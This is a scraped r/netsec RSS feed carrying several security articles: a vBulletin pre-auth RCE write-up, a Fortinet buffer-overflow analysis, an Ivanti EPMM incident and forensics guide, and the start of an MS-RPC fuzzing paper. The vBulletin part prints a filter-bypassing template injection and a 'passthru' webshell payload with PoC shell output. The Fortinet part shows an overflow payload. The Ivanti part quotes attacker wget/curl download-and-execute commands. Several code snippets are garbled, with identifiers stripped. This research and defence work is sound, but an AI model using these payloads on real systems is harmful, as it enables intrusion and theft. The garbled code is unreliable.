-        ]]></content:encoded></item><item><title>We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs</title><link>https://arxiv.org/pdf/2406.10279</link><author>/u/ScottContini</author><category>netsec</category><pubDate>Sun, 13 Apr 2025 21:25:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Consolidated View of Security Data: CVEs, Breaches, Ransomware &amp; EOL Tracking</title><link>https://cybermonit.com/</link><author>/u/Electrical-Wish-4221</author><category>netsec</category><pubDate>Sun, 13 Apr 2025 17:36:52 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item></channel></rss>
+template=test&id_name=test
+In this case, the call to the  PHP function at line 58 returns  because the method is , so execution will continue into the if condition, and the  magic method will be invoked at line 59, passing as first argument () the value “”. That means the execution goes on till line 91, trying to check whether the  method is “callable”; the method does not exist within the  class (neither in any  controller), but in its parent class , and it’s a  method… So, of course it is “callable”! 🙃As a consequence, execution will continue into the  method:()
+    {
+($method, $args) ();
+ ((($this, $method))) {
+;
+        }
+        $reflection ($this, $method);
+ ($reflection()  $reflection()  $reflection()  $method ) {
+;
+        }
+        $php_args ();
+ ($reflection()  $param) {
+ (($param(), $args)) {
+                $php_args[] $args[$param()];
+            }  {
+ ($param()) {
+                    $php_args[]  $param();
+                }  {
+(($param()));
+                }
+            }
+        }
+    }At lines 103-105 there is another if condition to check whether the controller’s method we are trying to invoke is actually “callable”. However, this time  returns  even for  methods, so it does not act as a safeguard here! 🔥As a result, execution will continue till line 122 (if the method we are trying to invoke is not a constructor / destructor or static), where the ReflectionMethod::invokeArgs() method will be used to ultimately invoke the controller’s method. As we have already seen, if vBulletin is running over PHP 8.1+, the call succeeds, and the  method is executed — bypassing the visibility control altogether, as shown by the following stack backtrace:#0 [internal function]: vB_Api_Ad->wrapAdTemplate('...', '...', '...')
+#1 /core/vb/api.php(122): ReflectionMethod->invokeArgs(Object(vB_Api_Ad), Array)
+#2 /core/vb/api/wrapper.php(92): vB_Api->callNamed('...', Array)
+#3 /core/vb/api/wrapper.php(59): vB_Api_Wrapper->__call('...', Array)
+#4 /includes/api/interface/collapsed.php(101): vB_Api_Wrapper->callNamed('...', Array)
+#5 /includes/vb5/frontend/applicationlight.php(358): Api_Interface_Collapsed->callApi('...', '...', Array, true)
+#6 /includes/vb5/frontend/applicationlight.php(170): vB5_Frontend_ApplicationLight->handleAjaxApi(Array)
+#7 /index.php(38): vB5_Frontend_ApplicationLight->execute()
+Wrapping up, vBulletin’s API design relies heavily on dynamic dispatch and Reflection, but it failed to enforce strict and proper access control. As a result, any  method in any  controller was exposed to unauthenticated users, when vBulletin was running over PHP 8.1 or later versions.This effectively breaks encapsulation and gives attackers a direct line to methods that were never meant to be externally reachable — setting the stage for pre-auth Remote Code Execution (RCE) attacks, as we’ll explore next.💥 Exploiting vBulletin: Path to Pre-Auth RCEThe ability to call a  method alone wouldn’t necessarily result in a critical vulnerability like a Remote Code Execution (RCE) — but in this case, it acts as the first domino.When I realized it was possible to invoke controllers'  methods, the first thing I did was to grep the string “” within every  controller, and it took me just a few minutes to find this RCE vector. Maybe there could be other ways to get a critical vulnerability out of this, by invoking other  methods… However, this is the first thing I tried out, it worked, it led to pre-auth RCE attacks, and so here you go! 🤓The first API controller I analyzed, by starting alphabetically, was . It implements a few  methods, but the most interesting one is the vB_Api_Ad::replaceAdTemplate() method, definitely:($styleid, $location, $template, $product )
+    {
+        $templateLib ();
+        $templateOptions (, );
+ {
+            $templateLib($styleid,  $location, $template, $product, , , , $templateOptions);
+        }  ( $e) {
+            $templateid  $templateLib( $location, $styleid);
+            $templateLib($templateid,  $location, $template, $product, , , , , $templateOptions);
+        }
+    }Such a method, that can be considered an internal helper function (called internally while saving / deleting ads), attempts to insert or update an “advertisement template” based on the provided input parameters. Specifically, the  parameter will be saved as template text and can be subsequently evaluated by the vBulletin’s template engine — while its output can be retrieved by leveraging the  route. Therefore, if we find a way to execute arbitrary PHP code by supplying specially crafted strings to the template engine, this can be the method we are looking for…It turns out there was another N-day vulnerability affecting vBulletin’s template engine, and it led to arbitrary PHP code execution (RCE) by abusing “Template Conditionals” ( tags). Basically, this gives the ability to use if conditions within the template code, something like the following:<vb:if condition="$my_variable == 1">
+    <p>My variable is equal to one.</p>
+<vb:elseif condition="$my_variable == 2" />
+    <p>My variable is equal to two.</p>
+<vb:else />
+    <p>My variable is equal to neither one nor two.</p>
+</vb:if>
+When parsed by the vBulletin’s template engine, the above template code would translate to the following PHP code that will be executed internally by vBulletin itself — by using  — while rendering the template:$final_rendered ;  ($my_variable ) {
+					$final_rendered ;
+				}  ($my_variable ) {
+					$final_rendered ;
+				}  {
+			$final_rendered ;
+                } $final_rendered ;That means we can try to inject our own arbitrary PHP code through the  attribute of a  tag! So, the first thing I did at this point, was to create a simple template like the following:<vb:if condition='phpinfo()'></vb:if>
+Unfortunately, this will produce an error, and the template will be rejected because it contains “unsafe functions”, as you can see in the following Burp Suite screenshot:After some digging, I realized vBulletin’s template parser enforces some security checks to prevent “unsafe functions” from being executed — and it does so using regular expressions. So, I tried a simple and straightforward potential bypass: in PHP, functions can be invoked not only in the usual way (e.g. ) but also using variable function calls — for instance, by calling the function name as a string. Consider the following:();
+();
+();
+();As of PHP 7.0.0, the above code will invoke the  PHP function three times, as you can see here, that means lines 5-7 are equivalent. As such, I tried to submit the following template code:<vb:if condition='"var_dump"("Hello from PHP")'></vb:if>
+And this one bypasses vBulletin’s security checks and goes through, we get no errors, and the template is successfully created! 😎This is also confirmed by the rendering of our template:So this is the end of our exploit chain! We can abuse a  method, vB_Api_Ad::replaceAdTemplate(), to create arbitrary templates, and we can get our own webshell on any vulnerable vBulletin 5.x or 6.x website by using a template like the following:<vb:if condition='"passthru"($_POST["cmd"])'></vb:if>
+Here you can find a full working Proof of Concept (PoC) script to reproduce this exploit chain. It’s a PHP script supposed to be used from the command line (CLI), and you should see an output like the following:$ php vBulletin-replaceAdTemplate-RCE.php 
+
++---------------------------------------------------------------------+
+| vBulletin (replaceAdTemplate) Remote Code Execution Exploit by EgiX |
++---------------------------------------------------------------------+
+
+Usage......: php vBulletin-replaceAdTemplate-RCE.php <URL>
+
+Example....: php vBulletin-replaceAdTemplate-RCE.php http://localhost/vb/
+Example....: php vBulletin-replaceAdTemplate-RCE.php https://vbulletin.com/
+
+
+$ php vBulletin-replaceAdTemplate-RCE.php http://192.168.1.23/vbulletin-6.0.1/
+
++---------------------------------------------------------------------+
+| vBulletin (replaceAdTemplate) Remote Code Execution Exploit by EgiX |
++---------------------------------------------------------------------+
+
+vBulletin-shell# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+vBulletin-shell# pwd
+/var/www/html/vbulletin-6.0.1
+
+vBulletin-shell# exit
+: the exploit has been successfully tested and confirmed to be working with vBulletin versions 5.1.0, 5.7.5, 6.0.1, and 6.0.3, running over PHP 8.1+. I’m not sure about version 6.0.4, but I think the “protected method invocation vulnerability” should be fixed starting from version 6.0.4, maybe… Who knows?! 😅What started as an exploration into a seemingly innocuous misuse of PHP’s Reflection API ended with a full-blown, unauthenticated Remote Code Execution (RCE) vulnerability affecting one of the most widely deployed commercial forum software packages on the Internet: vBulletin. This bug is a textbook example of why relying solely on method visibility for access control — especially in dynamically dispatched systems — is a dangerous design decision.The introduction of new behaviors in PHP 8.1 — such as  allowing invocation of  /  methods without  — shows how even subtle changes at the language level can dramatically alter the security posture of an application — especially when the application already walks a fine line in terms of architecture. While vBulletin’s decision to centralize controller routing and use Reflection may have been made in the name of flexibility or developer convenience, it inadvertently created a backdoor into the internals of the system.This issue also underscores a broader lesson: Reflection should never be used as a proxy for access control in dynamic routing implementations, in PHP applications at least… And if it is used, visibility checks must be  and  enforced. Anything less opens the door for attackers to cross privilege boundaries, often in surprising and dangerous ways.For defenders and developers: now is a good time to review your frameworks and custom APIs. If you’re dynamically routing controller methods through Reflection, audit whether you’re enforcing access restrictions robustly. Look at how your application behaves across different PHP versions, and always assume that method visibility alone is not a security boundary.For researchers: this vulnerability class might be ripe for further exploration. My quick survey of popular PHP platforms suggests that while vBulletin is the most egregious case, others may have similar patterns waiting to be exploited. Custom CMS platforms, internal admin panels, legacy enterprise code — all of these are candidates.In the end, this isn’t just a vBulletin story. It’s a cautionary tale about what happens when flexibility meets reflection — and security is left behind.]]></content:encoded></item><item><title>CVE-2025-32756: Write-Up of a Buffer Overflow in Various Fortinet Products</title><link>https://horizon3.ai/attack-research/attack-blogs/cve-2025-32756-low-rise-jeans-are-back-and-so-are-buffer-overflows/</link><author>/u/dinobyt3s</author><category>netsec</category><pubDate>Thu, 22 May 2025 19:45:42 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In their advisory, FortiGuard Labs states that Fortinet has observed this issue being exploited in the wild. The next day, May 14, the vulnerability was added to the CISA KEV catalog.The vulnerability is described in the advisory as a stack-based buffer overflow in the administrative API that can lead to unauthenticated remote code execution. Given that it’s being exploited in the wild, we figured we’d take a closer look. If you’d rather run the test instead of reading this write-up, coverage is already available in NodeZero.For our reversing efforts, we chose to look at a patched and unpatched version of FortiMail. The Indicators of Compromise (IOCs) listed in the advisory give us some hints about where to begin.The log output displayed here tells us a couple of important things:We’re looking for a way to execute the admin.fe cgi binaryThe web server is using mod_fcgid, which makes our lives a bit easier when attempting to exploit the target, as it’s unlikely that failed attempts will crash the entire httpd process and lock us out of the application.From the web server configuration file (httpd.conf), we find our entry point:  ScriptAlias /module/ "/migadmin/www/fcgi/"A quick curl request validates that we can hit the admin.fe endpoint:# curl -k -L -v https://REDACTED/module/admin.fe
+
+< HTTP/1.1 200 OK
+< Date: Tue, 20 May 2025 23:17:44 GMT
+< Cache-Control: no-cache
+< Strict-Transport-Security: max-age=31536000; includeSubDomains
+< Set-Cookie: _ffbe3e4d0e3350075e9c91f574e799cc=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: ParamStr=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: mTime=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: logLevel=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: logType=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: logStartline=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: logDomain=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: totalLineNumber=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Set-Cookie: SearchResultFile=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly
+< Vary: Accept-Encoding
+< X-XSS-Protection: 1; mode=block
+< X-Frame-Options: SAMEORIGIN
+< X-Content-Type-Options: nosniff
+< Content-Security-Policy: script-src 'self'; object-src 'none'; frame-ancestors 'self' https://*.fortimailcloud.com/ https://fortimail.forticloud.com/
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+<
+
+{"errorType": 7,"errorMsg": "Failed: Access denied","reqAction": 0,"totalRemoteCount": 0,"collection": "[]"}Unfortunately, when attempting to diff admin.fe between patched and unpatched versions… we discovered that the binaries were identical. This means the vulnerability is likely in a shared library, so it’s time to crack things open.Oh. Gross. A boost library… which likely means C++… Instead of beating our heads against the wall for the next several hours, we asked a ChatGPT for some help via the Ghidra-MCP bridge and Github Copilot.After taking a closer look at the function recommended to us, we spot a familiar string: APSCOOKIE. If you refer to our earlier test with curl, you’ll notice that one of the returned cookies was this very value.If you play with the admin web interface for a little bit, you’ll start to see the occasional requests to the admin.fe endpoint that contain this APSCOOKIE value, which appears to be used for session management.After decoding this cookie value we get:Era=0&Payload=qCStu1vT3v+Y++5pCCs9M/CxxddCRrC8SHg+9cfRCA42GU7Cf+8p3iBFSl/4vHteSGePZgk7KGMb8kzRR5c2boDUfiiD65jkByiD3DuRCj1NJR7ESpZQIZlOffSxykRbCTp5l3InoU+q6psG+ve+IRDk9za5K0No9T5RNxCwZxM=&AuthHash=kz4cHPsgudYxy4PPp123FUto=&The APSCOOKIE has the following URL-encoded fields:Those sound like great values to start grepping for.$ grep -rl "Era" ./762 | xargs grep -rl "Payload" | xargs grep -rl "AuthHash"
+rootfs/lib/libhttputil.so
+
+$ diff 762/rootfs/lib/libhttputil.so 763/rootfs/lib/libhttputil.so
+Binary files 762/rootfs/lib/libhttputil.so and 763/rootfs/lib/libhttputil.so differGiven that there is only one file with these values and it differs between patched and vulnerable versions of the products, it’s likely we’ve found the culprit.After loading up both versions in Ghidra, we can see that these strings are all referenced within the function cookieval_unwrap(). We decided to give our brains a break and see how far our little AI helper can get us.Not too bad for a first response. Let’s keep going.Unfortunately, responses start becoming less and less reliable after this, so let’s focus on some good old-fashioned manual analysis using ChatGPT’s observations as a starting point.Skimming through the function, cookieval_unwrap() appears to be dedicated to performing the base64 decoding of each ASPCOOKIE field and writing it back to the input buffer. Since Era is expected to be a single digit, let’s focus our efforts on Payload and AuthHash. We’ll skim through the decompilations of the patched and unpatched versions of the function to track down references to each of these values.----------
+Unpatched:
+----------
+size_t input_size;
+size_t __size;
+uchar *AuthHash;
+uchar *Payload;
+long output_buffer [2];
+out_00 = (uchar *)malloc(__size);
+
+iVar2 = __isoc99_sscanf(param_1,"Era=%1d&Payload=%m[^&]&AuthHash=%m[^&]&",&Era,&Payload, &AuthHash);
+
+input_size = strlen((char *)AuthHash);
+__size = strlen((char *)Payload);
+
+
+iVar3 = EVP_DecodeUpdate(ctx,(uchar *)output_buffer,&output_size,AuthHash,(int)input_size);
+
+iVar2 = EVP_DecodeUpdate(ctx,out_00,&local_94,Payload,iVar2);
+
+
+----------
+Patched:
+----------
+size_t input_size;
+size_t __size;
+uchar *AuthHash;
+uchar *Payload;
+long output_buffer [2];
+out_00 = (uchar *)malloc(__size);
+
+iVar2 = __isoc99_sscanf(param_1,"Era=%1d&Payload=%m[^&]&AuthHash=%m[^&]&",&Era,&Payload, &AuthHash);
+
+input_size = strlen((char *)AuthHash);
+__size = strlen((char *)Payload);
+
+input_size = strlen((char *)AuthHash);
+
+
+iVar3 = EVP_DecodeUpdate(ctx,(uchar *)output_buffer,&output_size,AuthHash,(int)input_size);
+
+iVar2 = EVP_DecodeUpdate(ctx,out_00,&local_94,Payload,iVar2);The key difference between the patched and unpatched function appears to be a size check for the size of the user-supplied AuthHash value. In the original version, we can see that AuthHash is decoded and written to the output buffer, which is only big enough to hold 16 bytes. In the patched version, we can see that the added size check limits the amount of data that a user can send in this value. Essentially, we now know that the memcpy() pointed out by ChatGPT isn’t entirely correct, and the real overflow occurs because of a call to EVP_DecodeUpdate() that writes beyond the bounds allocated for the decoded AuthHash value.Now we know where the overflow occurs, but how much control does it give us? Let’s take a look at the stack allocation starting with our output buffer:RSP+0x50 : local_78 (16 bytes)        <- Start of overflow
+RSP+0x60 : local_68 (4 bytes)         <- Overwritten
+RSP+0x70 : local_58 (16 bytes)        <- Overwritten
+RSP+0x80 : local_48 (16 bytes)        <- Overwritten
+RSP+0x90 : saved RBX                  <- Overwritten ---v
+RSP+0x98 : saved RBP                  <- Overwritten
+RSP+0xA0 : saved R12                  <- Overwritten   These are saved in the
+RSP+0xA8 : saved R13                  <- Overwritten   function prologue
+RSP+0xB0 : saved R14                  <- Overwritten
+RSP+0xB8 : saved R15                  <- Overwritten ---^
+RSP+0xC0 : return address (RIP)       <- OverwrittenAs execution continues, these stack values remain untouched until they are used again by the call to memcpy(). The call to memcpy() happens to use values we already control, which might be useful in crafting a working exploit, but isn’t necessary to delve into for now since we already control the value that will be written to RIP in the function epilogue.Let’s start sending some garbage data and see what happens! Since AuthHashl needs to be valid base64, let’s send a bunch of NULL characters properly encoded.AuthHash%3DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3D%3DLooks promising. After a bit of trial-and-error with some cyclic payloads, we’re able to determine the following:💥 Given how rare and antiquated simple memory corruptions issues like this have become in the modern age, it was a nice change of pace to revisit some good old-fashioned 90s-era hacking techniques.Given that this issue is under active exploitation and there are many vulnerable instances on the open internet, we’ve elected not to publish an exploit beyond this simple proof of concept. FortiGuard Lab’s advisory contains plenty of information regarding valuable Indicators of Compromise as well as detailed mitigation information. Given the ease of exploitation, we recommend all users update or apply mitigations as soon as possible.Coverage for this issue has been added to NodeZero and is available now.Start a NodeZero trial and test like an attacker.Validate your Fortinet defenses against real-world RCE threats.]]></content:encoded></item><item><title>Live Forensic Collection from Ivanti EPMM Appliances (CVE-2025-4427 &amp; CVE-2025-4428)</title><link>https://profero.io/blog/ivanti-epmm-attacks</link><author>/u/GelosSnake</author><category>netsec</category><pubDate>Thu, 22 May 2025 16:02:46 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In May 2025, Profero responded to multiple security incidents stemming from the active exploitation of two zero-day vulnerabilities in Ivanti Endpoint Manager Mobile (EPMM):CVE-2025-4427 – Authentication BypassCVE-2025-4428 – Remote Code ExecutionThese vulnerabilities, when chained, allow unauthenticated attackers to gain full remote command execution on exposed EPMM appliances. Profero has observed multiple threat actors leveraging public proof-of-concept (PoC) exploits — and in some cases, private tooling — to gain initial access, extract sensitive data, move laterally, and deploy post-exploitation malware including KrustyLoader[1], a known loader for Sliver backdoors.‍Organizations must act with urgency. Patching alone is not sufficient if an EPMM appliance was already compromised — and even patching combined with credential rotation may not fully neutralize the threat. Once inside EPMM, threat actors often use it as an internal foothold, harvesting credentials, accessing integrated systems (such as LDAP, exchange and SQL), and then pivoting into the broader environment.In Profero’s incident response engagements, multiple cases revealed that attackers had already moved laterally and established post-exploitation persistence before the EPMM appliance was isolated. Organizations should assume that any credentials stored on the appliance were compromised, and should immediately initiate network-wide threat hunting for signs of persistence — including C2 traffic, anomalous scheduled tasks, or rogue binaries. ‍If an EPMM appliance was compromised, patching without a full forensic review and threat hunt risks leaving an open door to a silent adversary already operating inside the network.‍Most EPMM environments lack visibility or native forensic tooling. Therefore, obtaining forensic data quickly and safely is essential when assessing potential compromise.This blog walks through how to extract forensic artifacts from a live Ivanti EPMM appliance, based on Profero’s real-world methodology. The goal: provide security teams with a reliable and repeatable process for forensic acquisition — even if they’ve never handled an Ivanti appliance before.Analysis of Attack MethodologyThe EPMM vulnerabilities (CVE-2025-4427 and CVE-2025-4428) are both trivial to exploit and highly impactful. Due to their low complexity and pre-authentication nature, multiple threat actors were able to rapidly weaponize the vulnerabilities — some even before public proof-of-concept (PoC) code was released.Once the PoC became publicly available, Profero observed a surge in global exploitation attempts, as various actors began racing to compromise as many exposed systems as possible. As is often the case with widely deployed enterprise software, existing offensive tooling — already designed for other Ivanti product families — was quickly repurposed and integrated into automated scanning frameworks.These attack kits typically follow a common flow:Automated Internet-wide scanning for exposed /api/v2/featureusage endpoints.Initial exploit using arithmetic expressions (e.g., ${9*9}) to confirm vulnerability.Callback-based validation (e.g., ping, curl, dig) to trigger outbound DNS queries for confirmation.Payload delivery via multiple chained methods (wget, curl, fetch).Execution and post-exploitation, such as data theft or malware deployment.The use of DNS-based callbacks is a particularly stealthy and reliable method for vulnerability confirmation. Attackers commonly used services like  or , which allow passive observation of whether a target executed the injected command. These services do not require attacker infrastructure or authentication, making them attractive for fast, anonymous reconnaissance.Profero observed that after confirming a host as exploitable, attackers escalated quickly — executing shell commands to:Drop and execute malware such as KrustyLoaderDump credential stores (LDAP, SQL)Extract system informationWrite output to web-accessible directoriesIn several incidents, payloads were hosted on compromised Amazon S3 buckets, or publicly accessible pastebin-style services, with filenames and buckets rotated frequently to avoid detection. Payloads were usually written to the /tmp directory — a strong behavioural indicator for incident responders since legitimate applications rarely execute binaries from this location.Profero identified a threat group that deployed KrustyLoader on compromised Ivanti EPMM appliances across multiple incident engagements. The loader was dropped to the /tmp directory following successful exploitation of CVE-2025-4427 and CVE-2025-4428.The attacker hosted the KrustyLoader payload on compromised S3 buckets and commonly used public CDNs to evade detection on the network. The commands used by this group to drop KrustyLoader used the following format, with the payload filename being randomly generated.wget http://<S3_BUCKET>.s3.amazonaws.com/<RANDOM_NAME> -O /tmp/1 || curl -o /tmp/1 http://<S3_BUCKET>.s3.amazonaws.com/<RANDOM_NAME> || fetch -o /tmp/1 http://<S3_BUCKET>.s3.amazonaws.com/<RANDOM_NAME>Immediately after the download, the attackers executed:chmod +x /tmp/1 && /tmp/1This executed the KrustyLoader binary, typically named generically as 1, from /tmp.‍KrustyLoader is a Rust-based malware loader designed for stealth. Profero observed the following behavior across infected systems:The loader removes its own binary post-execution to reduce forensic artifacts.It confirms it is running from the /tmp directory, checks for common debugging tools (e.g., gdb, lldb), and aborts execution if tampering is suspected.The loader exits early if certain runtime characteristics (e.g., parent PID = 1, missing temp files) suggest analysis is occurring.It decrypts a hardcoded staging URL using a multi-stage routine (hex decoding → XOR → AES-128-CFB) to retrieve the second-stage payload.If successful, it writes the decrypted payload to /tmp, sets execution permissions, and launches it — typically resulting in a Sliver backdoor installation.In several cases, attackers rotated their S3 buckets and payload names frequently and deleted the payloads shortly after deployment. This practice significantly complicates retroactive investigation and malware collection by incident responders.The presence of KrustyLoader is a strong indicator of intent to establish long-term persistence. In multiple incidents, Profero observed Sliver C2 beacons in environments where KrustyLoader had executed successfully. Sliver provides attackers with full interactive control over the host, including file uploads/downloads, shell access, lateral movement tooling, and post-exploitation modules.Even if the EPMM appliance is patched and all local credentials are rotated, the attacker may still maintain access through the Sliver backdoor or other persistence mechanisms already installed elsewhere in the network.Practical Forensic Collection from Ivanti EPMM AppliancesWhen triaging a potentially compromised Ivanti EPMM appliance, the key objective is to collect forensic evidence from the live system in a safe, structured manner — without interfering with critical functionality or tipping off a potential attacker.The steps below walk through how to:Access the underlying Linux OS securelyExtract logs, configurations, and indicators of compromise (IOCs)Collect a broad forensic collection using the UAC (Unix-like Artifact Collector) tool or similar UNIX/Linux base collectorsAnalyze artifacts offline with your preferred tools (e.g., open-source scanners, forensic suites)This process is designed for incident responders who have administrative access to a running EPMM appliance and need to validate or investigate suspicious activity.Step-by-Step: Forensic Collection from a Live Ivanti EPMM ApplianceAccess the Console and Enable CLIConnect to the EPMM appliance via console (either physical or hypervisor-based) and run:You'll be prompted for a password (provided by the organization system administrators).Generate a Temporary One-Time Password for SSH AccessIn CLI config mode, run:configure terminal service supportThis will generate a single-use, time-limited support password, valid for 30 minutes. It allows you to SSH into the appliance as the support user.SSH Into The ApplianceUsing the temporary credentials, SSH into the appliance from your forensic workstation:You now have shell access to the underlying OS.‍Collect Logs and Web Access DataBefore proceeding to tool-based collection, it’s strongly recommended to review the built-in logs that may show signs of exploitation.·        /var/log/httpd/https-access_log·        /var/log/httpd/https-request_logTo quickly search for known exploit attempts against the EPMM vulnerabilities, run:grep -R '/featureusage\(_history\)\?/.*f\.400' /var/log/httpd/*This command searches for access to /featureusage or /featureusage_history endpoints — a key indicator of CVE-2025-4427/CVE-2025-4428 exploitation attempts.Be sure to copy or archive these logs early, as they are subject to rotation and may be lost.Prepare for Artifact Collection with UACTo transfer files via SCP, you'll need to generate a second one-time password by repeating:enableconfigure terminalThen, from your local system, upload the UAC package (e.g., from https://github.com/tclahr/uac):scp uac.tar.gz support@<EPMM_IP>:/tmp/Generate a third one-time password and SSH back into the appliance to extract the tool:cd /tmptar -xzf uac.tar.gzRun UAC to Collect ForensicsUAC (Unix-like Artifact Collector) is a lightweight, open-source forensic triage tool used to gather logs, configuration, system state, and activity timelines from Unix systems. You can select a specific profile to match your triage goals (e.g., network-focused, persistence-focused). For most cases, we recommend starting with the full profile:./uac -p full -o uac_artifacts .This will produce a full set of forensic artifacts inside /tmp/uac_artifacts/Retrieve the ResultsGenerate a fourth one-time password, using the same steps (configure terminal → service support), then pull the archive using scp:scp support@<EPMM_IP>:/tmp/uac_artifacts.tar.gz .‍Analyze the Results OfflineOnce you have the artifact bundle, you can analyze it using any preferred forensic toolset. For example, you may run open-source scanners or APT detection tools like THOR[2] Community Edition (freely available from Nextron Systems).Key Benefits of This ApproachEnables collection from a live system, including memory artifacts (e.g., active processes, in-memory malware)Uses temporary, time-limited support access — no need for permanent changes or agentsLow-impact and repeatable process based on Ivanti’s supported CLICaptures a broad range of artifacts (logs, configs, crontabs, shell history) using UACArtifacts can be analyzed offline with any toolsetAs attackers continue to exploit vulnerabilities in edge infrastructure like Ivanti EPMM, organizations must be prepared to respond quickly and effectively — even when vendor tooling or visibility is limited. In several of Profero’s incident response cases, EPMM appliances were compromised, and forensic analysis played a critical role in understanding the scope of the attack, detecting persistence, and guiding containment.This guide demonstrates a repeatable, low-impact method for collecting forensic artifacts from Ivanti appliances using publicly available tools like UAC. By performing this analysis offline in a secure lab environment, security teams can minimize risk while preserving critical evidence.Whether you're validating suspected compromise, confirming clean posture, or preparing for a future IR scenario, having this process in place ensures you're not starting from zero when it matters most.Affected and Patched EPMM VersionsAffected Versions and Corresponding Patch Versions:11.12.0.4 and prior → Patch Version: 11.12.0.512.3.0.1 and prior → Patch Version: 12.3.0.212.4.0.1 and prior → Patch Version: 12.4.0.212.5.0.0 and prior → Patch Version: 12.5.0Organizations should monitor for the following indicators of compromise and implement them in the following systems: TIP, SIEM, Firewall, Web Proxy, Application Firewall, EDR/XDR, Mail relay/Security.craft-dev.greenenaftaligallery[.]com]]></content:encoded></item><item><title>Rare Code Base is a free and open-source learning platform for ethical hacking, programming, and more.</title><link>https://rarecodebase.com/</link><author>/u/Hello_World_00001</author><category>netsec</category><pubDate>Thu, 22 May 2025 15:09:00 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Learn Python, the most popular programming language for web development,
+                automation, and data science.
+                Learn Python
+              ]]></content:encoded></item><item><title>Automating MS-RPC vulnerability research</title><link>https://www.incendium.rocks/posts/Automating-MS-RPC-Vulnerability-Research/</link><author>/u/TangeloPublic9554</author><category>netsec</category><pubDate>Thu, 22 May 2025 12:12:46 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Microsoft Remote Procedure Call (MS-RPC) is a protocol used within Windows operating systems to enable inter-process communication, both locally and across networks. It allows clients to invoke procedures on remote systems as if they were local functions. However, this same functionality introduces an attack surface, especially when exposed over the network. This is because RPC services regularly are run by a high privilege identity to perform the requested actions. In recent years, several high and critical severity vulnerabilities have been discovered in MS-RPC, underlining its importance as a focus area for security research.Researching MS-RPC interfaces, however, poses several challenges. Manually analyzing RPC services can be time-consuming, especially when faced with hundreds of interfaces spread across different processes, services and accessible through various endpoints. Additionally, most existing tools for researching MS-RPC lack a way to visualize results. This complexity calls for more efficient, user-friendly, and automated tools to support security researchers and penetration testers.Currently, tools such as RpcView, RpcMon, and RpcInvestigator provide insight into active RPC services in real-time, focusing on enumeration and passive observation. While useful, these tools typically do not support deeper interaction with RPC endpoints, such as invoking methods or dynamically analyzing behavior.In contrast, the NtObjectManager PowerShell module, written by James Forshaw, allows for dynamic client generation and direct interaction with RPC servers. This allows users to easily create RPC clients without having to write a client with C++ and compile it with MIDL. This capability inspired the development of a new tool that combines dynamic client creation with fuzzing capabilities, enabling researchers to send randomized inputs to discover potential vulnerabilities in exposed RPC methods.This white paper will describe how MS-RPC security research can be automated using a fuzzing methodology to identify interesting RPC interfaces and procedures. It will explain how MS-RPC works, why NtObjectManager is such a fantastic tool, what problems this automated approach overcomes, how to do efficient fuzzing, how to handle complex parameter types, and how to analyze the fuzzing results by showing their relations in Neo4j.Note: The tool will be open sourced soon (after graduating).Before I continue with this White paper, I have to mention some people that have been a great source for inspiration. First, I have been inspired by the fantastic work of James Forshaw. Who is the developer of NtObjectManager which is a PowerShell module that adds a provider and cmdlets to access the NT object manager namespace. Other than that, James provides some of the only and best resources about MS-RPC vulnerabilities on his blog or talks at conferences.Another inspiration source is Ben Barnea, who is a security researcher at Akamai. In 2022, Akamai has done a lot of research into MS-RPC and disclosed their findings. Also, they have provided some guidance into how to start with MS-RPC vulnerability research. These posts motivated me to start researching MS-RPC as well.Next, I want to mention @itm4n and @XPN who made some awesome blogs about MS-RPC (related) topics that were very useful during my research.Next, I want to thank @FrankSpierings for the support on finding solutions for complex problems and new idea’s to improve the fuzzer.Finally, I want to thank my employer Warpnet, who let me take control of my own project and gave me all the space and time to take it to a good ending.Before we can actually automate MS-RPC vulnerability research, we need to know how MS-RPC works. Microsoft Remote Procedure Call (MS-RPC), is a protocol that uses the client-server model to set up communication. This protocol simplifies interprocess communication between clients and servers, enabling a client to call a service on a (remote) server with a standard interface.This next illustration shows the Remote Procedure Call (RPC) process, showing how a function call made on the client side is transmitted across a network to a server, executed there, and the result is returned to the client as if it was a local call.sequenceDiagram
+    participant Client_App as Client
+    participant Client_Stub as Client Stub
+    participant Client_Runtime as RPC Runtime (Client)
+    participant Server_Runtime as RPC Runtime (Server)
+    participant Server_Stub as Server Stub
+    participant Server_App as Server
+
+    %% Call from client application
+    Client_App->>Client_Stub: Call
+    Client_Stub->>Client_Runtime: Pack
